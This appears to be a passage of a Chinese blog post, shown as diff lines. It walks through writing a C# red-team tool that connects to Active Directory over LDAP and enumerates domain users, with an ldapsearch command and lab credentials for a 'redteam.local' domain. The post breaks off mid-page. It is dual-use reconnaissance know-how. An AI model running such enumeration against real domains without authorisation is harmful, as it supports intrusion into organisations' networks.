@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="项目地址：https:&#x2F;&#x2F;github.com&#x2F;yicunyiye&#x2F;FuckLdap 0x01 Ldap连接我们常规的ldap查询例如ldapsearch 1ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.11.16:389 -D &quot;CN&#x3D;hack,CN&#x3D;Users,DC&#x3D;redteam,DC&#x3D;local&quot; -w test123.. -b &quot;DC&#x3D;re">
+<meta property="og:type" content="article">
+<meta property="og:title" content="c#操作ldap">
+<meta property="og:url" content="http://example.com/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/index.html">
+<meta property="og:site_name" content="我是GG还是MM">
+<meta property="og:description" content="项目地址：https:&#x2F;&#x2F;github.com&#x2F;yicunyiye&#x2F;FuckLdap 0x01 Ldap连接我们常规的ldap查询例如ldapsearch 1ldapsearch -x -H ldap:&#x2F;&#x2F;192.168.11.16:389 -D &quot;CN&#x3D;hack,CN&#x3D;Users,DC&#x3D;redteam,DC&#x3D;local&quot; -w test123.. -b &quot;DC&#x3D;re">
+<meta property="og:locale">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img16@main/2021/10/01/1633088382782-d3a0a9b9-15de-489a-bc32-46606b902e64.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088403409-a17bedc5-51c2-4167-b886-ed174fbb3efc.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img1@main/2021/10/01/1633088414936-2b98ffe1-f2ae-43bd-9d52-fb402991021b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img2@main/2021/10/01/1633088427362-701802a0-5d39-4a47-9ce7-183415230e75.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img5@main/2021/10/01/1633088452249-ac636722-4320-4a0d-bef1-3ea3d85ab70d.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088468976-fab86b78-5cf2-4087-a996-0bd9db2b4f4b.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088478583-804062c4-3827-4e72-b253-dae9bd7d5044.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img17@main/2021/10/01/1633088490189-cd528aeb-2f9d-48e4-b0c0-80e9c84d720e.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088501243-7be00078-8a63-4da1-8d33-c31640484d97.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img19@main/2021/10/01/1633088516986-4eaffbea-f3dc-48c2-b0bd-21a003d74749.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img11@main/2021/10/01/1633088532594-ada9c117-a54f-4d77-b713-43b2fad42b83.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088546852-d4974e77-7b91-4246-a76c-63766d749206.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img15@main/2021/10/01/1633088565777-50f3824e-76ce-434b-b497-6763af4e7baf.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088582319-4254af82-8604-4d89-9d9b-77ffc1ecc06d.png">
+<meta property="article:published_time" content="2021-10-02T11:59:30.000Z">
+<meta property="article:modified_time" content="2021-10-03T17:41:59.121Z">
+<meta property="article:author" content="1">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/filess/img16@main/2021/10/01/1633088382782-d3a0a9b9-15de-489a-bc32-46606b902e64.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/10/02/csharp操作ldap/"/>
+
+
+
+
+
+  <title>c#操作ldap | 我是GG还是MM</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+<a target="_blank" rel="noopener" href="https://github.com/yicunyiye" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; left: 0; transform: scale(-1, 1);" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">我是GG还是MM</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/10/02/csharp%E6%93%8D%E4%BD%9Cldap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars.githubusercontent.com/u/47177122?v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我是GG还是MM">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">c#操作ldap</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-10-02T19:59:30+08:00">
+                2021-10-02
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/yicunyiye/FuckLdap">https://github.com/yicunyiye/FuckLdap</a></p>
+<h1 id="0x01-Ldap连接"><a href="#0x01-Ldap连接" class="headerlink" title="0x01 Ldap连接"></a>0x01 Ldap连接</h1><p>我们常规的ldap查询例如ldapsearch</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot;</span><br></pre></td></tr></table></figure>
+
+<p>ldap连接地址为：ldap://192.168.11.16<br>用户为hack<br>密码为test123..<br>​</p>
+<p>在域外我们需要指定ip地址，在域内我们只需要指定域名也行，例如测试环境的redteam，也就是ldap://redteam,这里就说明我们写代码的时候就需要考虑是在域内还是在域外。<br>​</p>
+<p>在c#进行ldap连接的时候需要引入DirectoryServices.dll，这个是系统自带的，自行寻找。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using System.DirectoryServices</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img16@main/2021/10/01/1633088382782-d3a0a9b9-15de-489a-bc32-46606b902e64.png"></p>
+<h2 id="1-1域外连接"><a href="#1-1域外连接" class="headerlink" title="1.1域外连接"></a>1.1域外连接</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string url = &quot;LDAP://192.168.11.16/&quot;;</span><br><span class="line">string username = &quot;hack&quot;;</span><br><span class="line">string password = &quot;test123..&quot;;</span><br><span class="line">DirectoryEntry coon = new DirectoryEntry(url,username, password);</span><br></pre></td></tr></table></figure>
+
+
+<p>DirectoryEntry类可封装 Active Directory 域服务层次结构中的节点或对象。<br>​</p>
+<h2 id="1-2-域内连接"><a href="#1-2-域内连接" class="headerlink" title="1.2 域内连接"></a>1.2 域内连接</h2><p>如果是在域内，我们直接可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DirectoryEntry coon = new DirectoryEntry();</span><br></pre></td></tr></table></figure>
+
+
+<p>所以我们就要判断下两种情况。我们知道了要用coon来获取节点列表，用search来进行条件查询。我们可以写两个方法来进行获取：<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//域内</span><br><span class="line">public static DirectoryEntry Get_coon_nopass()</span><br><span class="line">&#123;</span><br><span class="line">    coon = new DirectoryEntry();</span><br><span class="line">    return coon;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static DirectorySearcher Get_search_nopass()</span><br><span class="line">&#123;</span><br><span class="line">    search = new DirectorySearcher(coon);</span><br><span class="line">    return search;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">//域外</span><br><span class="line">public static void SET_LDAP_USER_PASS()</span><br><span class="line">&#123;</span><br><span class="line">    url = &quot;LDAP://&quot; + GetArgsValue.domain;</span><br><span class="line">    username = GetArgsValue.user;</span><br><span class="line">    password = GetArgsValue.pass;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">public static DirectoryEntry Get_coon()</span><br><span class="line">&#123;</span><br><span class="line">    coon = new DirectoryEntry(url, username, password);</span><br><span class="line">    return coon;</span><br><span class="line">&#125;</span><br><span class="line">public static DirectorySearcher Get_search()</span><br><span class="line">&#123;</span><br><span class="line">    search = new DirectorySearcher(coon);</span><br><span class="line">    return search;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>域内很好理解，这里来说下域外。<br>SET_LDAP_USER_PASS()这个方法用来获取url，username，password，然后调用了GetArgsValue类里面的属性。<br>​</p>
+<p>这里我用了NDesk.Options来处理获取的参数。<br>​</p>
+<p>先定义三个list<string></string></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;string&gt; domains = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; users = new List&lt;string&gt;();</span><br><span class="line">List&lt;string&gt; passes = new List&lt;string&gt;();</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;t|target=&quot;, &quot;the &#123;Target&#125; of the needed to add user&quot;,v =&gt; adduser.Add (v) &#125;,</span><br><span class="line">&#123; &quot;d|domain=&quot;, &quot;the &#123;IP&#125; of the target&quot;,v =&gt; domains.Add (v) &#125;,</span><br><span class="line">&#123; &quot;u|user=&quot;, &quot;the &#123;user&#125; of the target&quot;,v =&gt; users.Add (v) &#125;,</span><br></pre></td></tr></table></figure>
+
+
+<p>这里的意思就是当用户输入-t -d -u 后面接受的值分别传递给了domains,users,passes。<br>​</p>
+<p>然后写了个GetArgsValue类来存储这些值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    public static string domain = &quot;&quot;;</span><br><span class="line">    public static string user = &quot;&quot;;</span><br><span class="line">    public static string pass = &quot;&quot;;</span><br><span class="line">public static void GetDomainValue(List&lt;string&gt; param1 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param1)</span><br><span class="line">        &#123;</span><br><span class="line">            domain = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GetUserValue(List&lt;string&gt; param2 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param2)</span><br><span class="line">        &#123;</span><br><span class="line">            user = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void GetPassValue(List&lt;string&gt; param3 = null)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (string p in param3)</span><br><span class="line">        &#123;</span><br><span class="line">            pass = p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后在主函数调用了一下方法。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//domain ip</span><br><span class="line">GetArgsValue.GetDomainValue(domains);</span><br><span class="line">//domain user</span><br><span class="line">GetArgsValue.GetUserValue(users);</span><br><span class="line">//domain pass</span><br><span class="line">GetArgsValue.GetPassValue(passes);</span><br></pre></td></tr></table></figure>
+
+
+<p>那么当用户输入的值就会存储在GetArgsValue类里面的3个字段里。现在看到一下就很好理解了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = &quot;LDAP://&quot; + GetArgsValue.domain;</span><br><span class="line">username = GetArgsValue.user;</span><br><span class="line">password = GetArgsValue.pass;</span><br></pre></td></tr></table></figure>
+
+
+<p>域内外连接都写了，然后就要写一个方法来接受我们的连接。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public static void LDAP_COON()</span><br><span class="line">&#123;</span><br><span class="line">    if(GetArgsValue.user == &quot;&quot; &amp;&amp; GetArgsValue.pass == &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            coon = Get_coon_nopass();</span><br><span class="line">            search = Get_search_nopass();</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">            Font.Warning();</span><br><span class="line">            Console.WriteLine(&quot;connection ldap fail&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else if(GetArgsValue.user != &quot;&quot; &amp;&amp; GetArgsValue.pass != &quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            SET_LDAP_USER_PASS();</span><br><span class="line">            coon = Get_coon();</span><br><span class="line">            search = Get_search();</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">            Font.Warning();</span><br><span class="line">            Console.WriteLine(&quot;connection ldap fail&quot;);</span><br><span class="line">            Font.NormailFonts();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我的方法就是当GetArgsValue.user和GetArgsValue.pass的值为空的时候就会执行域内连接方法，否则就为域外。<br>​</p>
+<p>我们把这个连接方法封装到Ldapcoon类里面，方便后面的调用</p>
+<p>当在域外输入以下就会连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx.exe -d 192.168.11.16 -u hack -p test123..</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h1 id="0x02-Filter搜索条件"><a href="#0x02-Filter搜索条件" class="headerlink" title="0x02 Filter搜索条件"></a>0x02 Filter搜索条件</h1><p>这里只会讲一些我们需要用到的一些语法，其他语法如果感兴趣可以自行搜索下。<br>​</p>
+<p>这里先举例获取域内用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&amp;(objectClass=user)(objectCategory=person))</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img14@main/2021/10/01/1633088403409-a17bedc5-51c2-4167-b886-ed174fbb3efc.png"></p>
+<p>在c#中DirectorySearcher类的作用是对 Active Directory 域服务执行查询<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public DirectorySearcher (System.DirectoryServices.DirectoryEntry searchRoot);</span><br><span class="line"></span><br><span class="line">searchRoot</span><br><span class="line">DirectoryEntry</span><br><span class="line">Active Directory 域服务层次结构中的节点，从该节点处开始搜索。 SearchRoot 属性初始化为该值。</span><br></pre></td></tr></table></figure>
+
+
+<p>设置filter为查询域内所有用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">DirectorySearcher search = new DirectorySearcher(coon);</span><br><span class="line">search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">foreach (SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>这里name值如何而来，我其实是这样看的：<br>我们先用ldapsearch执行该语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -x -H ldap://192.168.11.16:389 -D &quot;CN=hack,CN=Users,DC=redteam,DC=local&quot; -w test123.. -b &quot;DC=redteam,DC=local&quot; &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img1@main/2021/10/01/1633088414936-2b98ffe1-f2ae-43bd-9d52-fb402991021b.png"></p>
+<p>代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Linq;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line"></span><br><span class="line">namespace DemoLdap</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            string url = &quot;LDAP://192.168.11.16&quot;;</span><br><span class="line">            string username = &quot;hack&quot;;</span><br><span class="line">            string password = &quot;test123..&quot;;</span><br><span class="line">            DirectoryEntry coon = new DirectoryEntry(url, username, password);</span><br><span class="line">            DirectorySearcher search = new DirectorySearcher(coon);</span><br><span class="line">            search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">            foreach(SearchResult r in search.FindAll())</span><br><span class="line">            &#123;</span><br><span class="line">                string users = &quot;&quot;;</span><br><span class="line">                try</span><br><span class="line">                &#123;</span><br><span class="line">                    users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">                    Console.WriteLine(users);</span><br><span class="line">                &#125;</span><br><span class="line">                catch</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(&quot;error&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>执行结果为：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/filess/img2@main/2021/10/01/1633088427362-701802a0-5d39-4a47-9ce7-183415230e75.png"></p>
+<h1 id="0x03-c-获取域内基本信息"><a href="#0x03-c-获取域内基本信息" class="headerlink" title="0x03 c#获取域内基本信息"></a>0x03 c#获取域内基本信息</h1><p>前面连接函数已经写好后面获取这些基本信息就很简单了。<br>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public static void GetAllUsers()</span><br><span class="line">&#123;</span><br><span class="line">    try</span><br><span class="line">    &#123;</span><br><span class="line">        Ldapcoon.LDAP_COON();</span><br><span class="line">        Ldapcoon.search.Filter = &quot;(&amp;(objectClass=user)(objectCategory=person))&quot;;</span><br><span class="line">        Font.InfoFonts();</span><br><span class="line">        Console.WriteLine(&quot;===========All Users===========&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">        foreach (SearchResult r in Ldapcoon.search.FindAll())</span><br><span class="line">        &#123;</span><br><span class="line">            string domain_users = &quot;&quot;;</span><br><span class="line">            domain_users = r.Properties[&quot;name&quot;][0].ToString();</span><br><span class="line">            Console.WriteLine(domain_users);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch</span><br><span class="line">    &#123;</span><br><span class="line">        Font.Warning();</span><br><span class="line">        Console.WriteLine(&quot;error!&quot;);</span><br><span class="line">        Font.NormailFonts();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
